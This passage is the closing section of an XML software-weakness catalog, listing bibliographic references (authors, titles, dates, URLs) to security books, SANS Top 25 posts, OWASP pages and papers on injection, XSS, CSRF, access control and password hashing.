         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---09</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/09/top-25-series-rank-7-path-traversal/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-207">
         <Author>John Viega</Author>
         <Author>Gary McGraw</Author>
         <Title>Building Secure Software: How to Avoid Security Problems the Right Way</Title>
         <Edition>1st Edition</Edition>
         <Publication_Year>2002</Publication_Year>
         <Publisher>Addison-Wesley</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-229">
         <Author>NIST</Author>
         <Title>Role Based Access Control and Role Based Security</Title>
         <URL>http://csrc.nist.gov/groups/SNS/rbac/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-231">
         <Author>Frank Kim</Author>
         <Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---04</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-233">
         <Author>Rahul Bhattacharjee</Author>
         <Title>Authentication using JAAS</Title>
         <URL>http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-236">
         <Author>Kim Zetter</Author>
         <Title>Weak Password Brings 'Happiness' to Twitter Hacker</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publication_Day>---09</Publication_Day>
         <URL>http://www.wired.com/threatlevel/2009/01/professed-twitt/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-237">
         <Author>OWASP</Author>
         <Title>Top 10 2007-Broken Authentication and Session Management</Title>
         <Publication_Year>2007</Publication_Year>
         <URL>http://www.owasp.org/index.php/Top_10_2007-A7</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-238">
         <Author>OWASP</Author>
         <Title>Guide to Authentication</Title>
         <URL>http://www.owasp.org/index.php/Guide_to_Authentication</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-239">
         <Author>Microsoft</Author>
         <Title>Authentication</Title>
         <URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-265">
         <Author>Frank Kim</Author>
         <Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---26</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/26/top-25-series-rank-10-missing-encryption-of-sensitive-data/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-267">
         <Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
         <Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
         <Publication_Year>2001</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---25</Publication_Day>
         <URL>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-271">
         <Author>OWASP</Author>
         <Title>Top 10 2007-Insecure Communications</Title>
         <Publication_Year>2007</Publication_Year>
         <URL>http://www.owasp.org/index.php/Top_10_2007-A9</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-280">
         <Author>Bruce Schneier</Author>
         <Title>Applied Cryptography</Title>
         <Publication_Year>1996</Publication_Year>
         <Publisher>John Wiley &amp; Sons</Publisher>
         <URL>http://www.schneier.com/book-applied.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-281">
         <Author>Alfred J. Menezes</Author>
         <Author>Paul C. van Oorschot</Author>
         <Author>Scott A. Vanstone</Author>
         <Title>Handbook of Applied Cryptography</Title>
         <Publication_Year>1996</Publication_Year>
         <Publication_Month>--10</Publication_Month>
         <URL>http://www.cacr.math.uwaterloo.ca/hac/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-282">
         <Author>C Matthew Curtin</Author>
         <Title>Avoiding bogus encryption products: Snake Oil FAQ</Title>
         <Publication_Year>1998</Publication_Year>
         <Publication_Month>--04</Publication_Month>
         <Publication_Day>---10</Publication_Day>
         <URL>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-284">
         <Author>Paul F. Roberts</Author>
         <Title>Microsoft Scraps Old Encryption in New Code</Title>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---15</Publication_Day>
         <URL>http://www.eweek.com/c/a/Security/Microsoft-Scraps-Old-Encryption-in-New-Code/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-287">
         <Author>Johannes Ullrich</Author>
         <Title>Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---25</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/25/top-25-series-rank-24-use-of-a-broken-or-risky-cryptographic-algorithm/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-289">
         <Author>Alexander Sotirov et al.</Author>
         <Title>MD5 considered harmful today</Title>
         <URL>http://www.phreedom.org/research/rogue-ca/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-291">
         <Author>Johnny Shelley</Author>
         <Title>bcrypt</Title>
         <URL>http://bcrypt.sourceforge.net/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-292">
         <Author>Colin Percival</Author>
         <Title>Tarsnap - The scrypt key derivation function and encryption utility</Title>
         <URL>http://www.tarsnap.com/scrypt.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-293">
         <Author>B. Kaliski</Author>
         <Title>RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0</Title>
         <Publication_Year>2000</Publication_Year>
         <URL>http://tools.ietf.org/html/rfc2898</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-294">
         <Author>Coda Hale</Author>
         <Title>How To Safely Store A Password</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publication_Day>---31</Publication_Day>
         <URL>http://codahale.com/how-to-safely-store-a-password/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-295">
         <Author>Brian Krebs</Author>
         <Title>How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)</Title>
         <Publication_Year>2012</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---11</Publication_Day>
         <URL>http://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-296">
         <Author>Solar Designer</Author>
         <Title>Password security: past, present, future</Title>
         <Publication_Year>2012</Publication_Year>
         <URL>http://www.openwall.com/presentations/PHDays2012-Password-Security/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-297">
         <Author>Troy Hunt</Author>
         <Title>Our password hashing has no clothes</Title>
         <Publication_Year>2012</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---26</Publication_Day>
         <URL>http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-298">
         <Author>Joshbw</Author>
         <Title>Should we really use bcrypt/scrypt?</Title>
         <Publication_Year>2012</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---08</Publication_Day>
         <URL>http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-329">
         <Author>Peter W</Author>
         <Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)</Title>
         <Publication>Bugtraq</Publication>
         <URL>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-330">
         <Author>OWASP</Author>
         <Title>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</Title>
         <URL>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-331">
         <Author>Edward W. Felten</Author>
         <Author>William Zeller</Author>
         <Title>Cross-Site Request Forgeries: Exploitation and Prevention</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--10</Publication_Month>
         <Publication_Day>---18</Publication_Day>
         <URL>http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-332">
         <Author>Robert Auger</Author>
         <Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ</Title>
         <URL>http://www.cgisecurity.com/articles/csrf-faq.shtml</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-333">
         <Title>Cross-site request forgery</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>Wikipedia</Publisher>
         <URL>http://en.wikipedia.org/wiki/Cross-site_request_forgery</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-334">
         <Author>Jason Lam</Author>
         <Title>Top 25 Series - Rank 4 - Cross Site Request Forgery</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---03</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-335">
         <Author>Jeff Atwood</Author>
         <Title>Preventing CSRF and XSRF Attacks</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--10</Publication_Month>
         <Publication_Day>---14</Publication_Day>
         <URL>http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-44">
         <Author>Michael Howard</Author>
         <Author>David LeBlanc</Author>
         <Author>John Viega</Author>
         <Title>24 Deadly Sins of Software Security</Title>
         <Publication>McGraw-Hill</Publication>
         <Publication_Year>2010</Publication_Year>
      </External_Reference>
      <External_Reference Reference_ID="REF-45">
         <Author>OWASP</Author>
         <Title>OWASP Enterprise Security API (ESAPI) Project</Title>
         <URL>http://www.owasp.org/index.php/ESAPI</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-483">
         <Author>Craig A. Shue</Author>
         <Author>Andrew J. Kalafut</Author>
         <Author>Minaxi Gupta</Author>
         <Title>Exploitable Redirects on the Web: Identification, Prevalence, and Defense</Title>
         <URL>http://www.cs.indiana.edu/cgi-pub/cshue/research/woot08.pdf</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-484">
         <Author>Russ McRee</Author>
         <Title>Open redirect vulnerabilities: definition and prevention</Title>
         <Edition>Issue 17</Edition>
         <Publication>(IN)SECURE</Publication>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-485">
         <Author>Jason Lam</Author>
         <Title>Top 25 Series - Rank 23 - Open Redirect</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---25</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-62">
         <Author>Mark Dowd</Author>
         <Author>John McDonald</Author>
         <Author>Justin Schuh</Author>
         <Title>The Art of Software Security Assessment</Title>
         <Edition>1st Edition</Edition>
         <Publication_Year>2006</Publication_Year>
         <Publisher>Addison Wesley</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-685">
         <Author>Pascal Meunier</Author>
         <Title>Meta-Character Vulnerabilities</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---20</Publication_Day>
         <URL>http://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-686">
         <Author>Robert Auger</Author>
         <Title>OS Commanding</Title>
         <Publication_Year>2009</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <URL>http://projects.webappsec.org/OS-Commanding</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-687">
         <Author>Lincoln Stein</Author>
         <Author>John Stewart</Author>
         <Title>The World Wide Web Security FAQ</Title>
         <Publication_Year>2002</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---04</Publication_Day>
         <URL>http://www.w3.org/Security/Faq/wwwsf4.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-688">
         <Author>Jordan Dimov, Cigital</Author>
         <Title>Security Issues in Perl Scripts</Title>
         <URL>http://www.cgisecurity.com/lib/sips.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-690">
         <Author>Frank Kim</Author>
         <Title>Top 25 Series - Rank 9 - OS Command Injection</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---24</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/24/top-25-series-rank-9-os-command-injection/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-7">
         <Author>Michael Howard</Author>
         <Author>David LeBlanc</Author>
         <Title>Writing Secure Code</Title>
         <Edition>2nd Edition</Edition>
         <Publication_Year>2002</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publication_Day>---04</Publication_Day>
         <Publisher>Microsoft Press</Publisher>
         <URL>https://www.microsoft.com/mspress/books/toc/5957.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-709">
         <Author>Jeremiah Grossman</Author>
         <Author>Robert "RSnake" Hansen</Author>
         <Author>Petko "pdp" D. Petkov</Author>
         <Author>Anton Rager</Author>
         <Author>Seth Fogie</Author>
         <Title>XSS Attacks</Title>
         <Publication_Year>2007</Publication_Year>
         <Publisher>Syngress</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-712">
         <Title>Cross-site scripting</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--08</Publication_Month>
         <Publication_Day>---26</Publication_Day>
         <Publisher>Wikipedia</Publisher>
         <URL>http://en.wikipedia.org/wiki/Cross-site_scripting</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-714">
         <Author>RSnake</Author>
         <Title>XSS (Cross Site Scripting) Cheat Sheet</Title>
         <URL>http://ha.ckers.org/xss.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-715">
         <Author>Microsoft</Author>
         <Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Title>
         <URL>http://msdn.microsoft.com/en-us/library/ms533046.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-716">
         <Author>Mark Curphey, Microsoft</Author>
         <Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!</Title>
         <URL>http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-718">
         <Author>Ivan Ristic</Author>
         <Title>XSS Defense HOWTO</Title>
         <URL>http://blog.modsecurity.org/2008/07/do-you-know-how.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-719">
         <Author>OWASP</Author>
         <Title>Web Application Firewall</Title>
         <URL>http://www.owasp.org/index.php/Web_Application_Firewall</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-720">
         <Author>Web Application Security Consortium</Author>
         <Title>Web Application Firewall Evaluation Criteria</Title>
         <URL>http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-721">
         <Author>RSnake</Author>
         <Title>Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest</Title>
         <Publication_Year>2007</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publication_Day>---19</Publication_Day>
      </External_Reference>
      <External_Reference Reference_ID="REF-722">
         <Title>XMLHttpRequest allows reading HTTPOnly cookies</Title>
         <Publisher>Mozilla</Publisher>
         <URL>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-723">
         <Title>Apache Wicket</Title>
         <URL>http://wicket.apache.org/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-724">
         <Author>OWASP</Author>
         <Title>XSS (Cross Site Scripting) Prevention Cheat Sheet</Title>
         <URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-725">
         <Author>OWASP</Author>
         <Title>DOM based XSS Prevention Cheat Sheet</Title>
         <URL>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-726">
         <Author>Jason Lam</Author>
         <Title>Top 25 series - Rank 1 - Cross Site Scripting</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-76">
         <Author>Sean Barnum</Author>
         <Author>Michael Gegick</Author>
         <Title>Least Privilege</Title>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publication_Day>---14</Publication_Day>
         <URL>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-859">
         <Author>Steven Christey</Author>
         <Title>Argument injection issues</Title>
         <URL>http://www.securityfocus.com/archive/1/archive/1/460089/100/100/threaded</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-867">
         <Author>OWASP</Author>
         <Title>SQL Injection Prevention Cheat Sheet</Title>
         <URL>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-868">
         <Author>Steven Friedl</Author>
         <Title>SQL Injection Attacks by Example</Title>
         <Publication_Year>2007</Publication_Year>
         <Publication_Month>--10</Publication_Month>
         <Publication_Day>---10</Publication_Day>
         <URL>http://www.unixwiz.net/techtips/sql-injection.html</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-869">
         <Author>Ferruh Mavituna</Author>
         <Title>SQL Injection Cheat Sheet</Title>
         <Publication_Year>2007</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---15</Publication_Day>
         <URL>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-870">
         <Author>David Litchfield</Author>
         <Author>Chris Anley</Author>
         <Author>John Heasman</Author>
         <Author>Bill Grindlay</Author>
         <Title>The Database Hacker's Handbook: Defending Database Servers</Title>
         <Publication_Year>2005</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publication_Day>---14</Publication_Day>
         <Publisher>Wiley</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-871">
         <Author>David Litchfield</Author>
         <Title>The Oracle Hacker's Handbook: Hacking and Defending Oracle</Title>
         <Publication_Year>2007</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publication_Day>---30</Publication_Day>
         <Publisher>Wiley</Publisher>
      </External_Reference>
      <External_Reference Reference_ID="REF-872">
         <Author>Microsoft</Author>
         <Title>SQL Injection</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <URL>http://msdn.microsoft.com/en-us/library/ms161953.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-873">
         <Author>Microsoft Security Vulnerability Research &amp; Defense</Author>
         <Title>SQL Injection Attack</Title>
         <URL>http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-874">
         <Author>Michael Howard</Author>
         <Title>Giving SQL Injection the Respect it Deserves</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---15</Publication_Day>
         <URL>http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-875">
         <Author>Frank Kim</Author>
         <Title>Top 25 Series - Rank 2 - SQL Injection</Title>
         <Publication_Year>2010</Publication_Year>
         <Publication_Month>--03</Publication_Month>
         <Publication_Day>---01</Publication_Day>
         <Publisher>SANS Software Security Institute</Publisher>
         <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/01/top-25-series-rank-2-sql-injection/</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-879">
         <Author>SPI Dynamics</Author>
         <Title>Web Applications and LDAP Injection</Title>
      </External_Reference>
      <External_Reference Reference_ID="REF-882">
         <Author>Amit Klein</Author>
         <Title>Blind XPath Injection</Title>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publication_Day>---19</Publication_Day>
         <URL>http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-926">
         <Title>Top 10 2013</Title>
         <Publication_Year>2013</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---12</Publication_Day>
         <Publisher>OWASP</Publisher>
         <URL>https://www.owasp.org/index.php/Top_10_2013</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-927">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A1-Injection</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A1-Injection</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-929">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A2-Broken Authentication and Session Management</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-930">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A3-Cross-Site Scripting (XSS)</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_%28XSS%29</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-931">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A4-Insecure Direct Object References</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-932">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A5-Security Misconfiguration</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-933">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A6-Sensitive Data Exposure</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-934">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A7-Missing Function Level Access Control</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-935">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A8-Cross-Site Request Forgery (CSRF)</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_%28CSRF%29</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-936">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A9-Using Components with Known Vulnerabilities</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities</URL>
      </External_Reference>
      <External_Reference Reference_ID="REF-937">
         <Author>OWASP</Author>
         <Title>Top 10 2013-A10-Unvalidated Redirects and Forwards</Title>
         <URL>https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards</URL>
      </External_Reference>
</External_References>
</Weakness_Catalog>